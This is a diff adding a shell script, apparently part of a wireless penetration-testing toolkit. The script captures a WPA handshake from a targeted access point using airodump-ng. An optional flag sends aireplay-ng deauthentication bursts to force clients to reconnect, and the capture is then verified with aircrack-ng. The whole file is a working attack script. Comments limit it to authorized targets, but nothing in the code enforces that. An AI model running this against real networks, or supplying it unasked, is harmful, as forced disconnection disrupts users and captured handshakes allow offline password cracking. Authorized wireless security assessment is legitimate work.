@@ -1,0 +1,41 @@
+#!/bin/sh
+# leviathan-handshake — targeted WPA handshake capture on one AP.
+# For authorized testing of networks you own or are contracted to assess.
+#
+#   leviathan-handshake <bssid> <channel> [seconds]
+#
+# Captures on mon0; writes a pcap. Does NOT transmit deauth by itself —
+# pass -d to opt into a client-deauth nudge (authorized targets only).
+
+MON="mon0"
+DEAUTH=0
+[ "$1" = "-d" ] && { DEAUTH=1; shift; }
+BSSID="$1"; CH="$2"; SECS="${3:-60}"
+
+[ -n "$BSSID" ] && [ -n "$CH" ] || { echo "usage: leviathan-handshake [-d] <bssid> <channel> [seconds]"; exit 1; }
+command -v airodump-ng >/dev/null || { echo "[leviathan] airodump-ng missing"; exit 1; }
+iw dev "$MON" info >/dev/null 2>&1 || { echo "[leviathan] $MON not up — run: leviathan-mon up"; exit 1; }
+
+mkdir -p /tmp/leviathan
+BSSID_CLEAN=$(echo "$BSSID" | tr -d ':')
+OUT="/tmp/leviathan/hs-${BSSID_CLEAN}-$(date +%H%M%S)"
+iw dev "$MON" set channel "$CH" 2>/dev/null
+
+echo "[leviathan] capturing handshake for $BSSID on ch$CH (${SECS}s) -> ${OUT}-01.cap"
+timeout "$SECS" airodump-ng -c "$CH" --bssid "$BSSID" -w "$OUT" "$MON" >/dev/null 2>&1 &
+ADPID=$!
+
+if [ "$DEAUTH" = "1" ]; then
+	command -v aireplay-ng >/dev/null && {
+		sleep 5
+		echo "[leviathan] sending 3 deauth bursts to nudge a reconnect (authorized targets only)"
+		aireplay-ng --deauth 3 -a "$BSSID" "$MON" >/dev/null 2>&1
+	}
+fi
+
+wait $ADPID 2>/dev/null
+if command -v aircrack-ng >/dev/null && aircrack-ng "${OUT}-01.cap" 2>/dev/null | grep -q "1 handshake"; then
+	echo "[leviathan] HANDSHAKE CAPTURED -> ${OUT}-01.cap"
+else
+	echo "[leviathan] no handshake yet in ${OUT}-01.cap — retry, or add -d on an authorized target"
+fi
